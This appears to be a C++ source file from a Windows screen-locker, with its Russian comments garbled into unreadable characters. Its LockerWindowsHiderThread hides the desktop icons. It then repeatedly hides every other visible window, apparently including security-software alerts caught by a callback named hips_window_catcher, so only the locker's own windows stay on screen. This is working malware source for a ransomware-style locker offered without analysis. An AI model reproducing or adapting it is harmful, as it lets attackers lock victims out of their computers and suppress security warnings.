static zgui::Array<HWND> _hiddenWindows;

BOOL CALLBACK hips_window_catcher(HWND hWnd, LPARAM lParam)
{
    if (hWnd == NULL){
        return TRUE;
    }
    if (!IsWindowVisible(hWnd)) { // �� �������� ��� ��������� ���� - ����������.
        if (zgui::ActiveWindows::getInstance()->contains(hWnd)) {
            ShowWindow(hWnd, SW_SHOWNA);
        }
        return TRUE;
    }

    if (zgui::ActiveWindows::getInstance()->contains(hWnd)) {
        return TRUE;
    }

    _hiddenWindows.add(hWnd);
    ShowWindow(hWnd, SW_HIDE);

    return TRUE;
}

zgui_ImplementSingleton(LockerWindowsHiderThread)

LockerWindowsHiderThread::LockerWindowsHiderThread()
{

}

LockerWindowsHiderThread::~LockerWindowsHiderThread()
{

}

void LockerWindowsHiderThread::run()
{
    HWND hWnd;
    hWnd = FindWindowA("Progman", NULL);
    if (hWnd != 0) {
        hWnd = FindWindowExA(hWnd, NULL, "SHELLDLL_DefView", NULL);
        if (hWnd != 0) {
            // ������ ���� �� ������� ������ �������� �����.
            ShowWindow(hWnd, SW_HIDE);
        }
    }

    for ( ; !threadShouldExit(); ) {
        EnumWindows(hips_window_catcher, NULL);
        SleepEx(300, FALSE);

    }

    // ���������� ���� �� ������� ������ �������� �����.
    if (hWnd != 0) {
        ShowWindow(hWnd, SW_SHOWNA);
    }

    // ��������������� ��� ��������� ����.
    for (int i = 0; i < _hiddenWindows.size(); ++i) {
        ShowWindow((HWND)_hiddenWindows[i], SW_SHOWNA);
    }

    _hiddenWindows.clear();
}
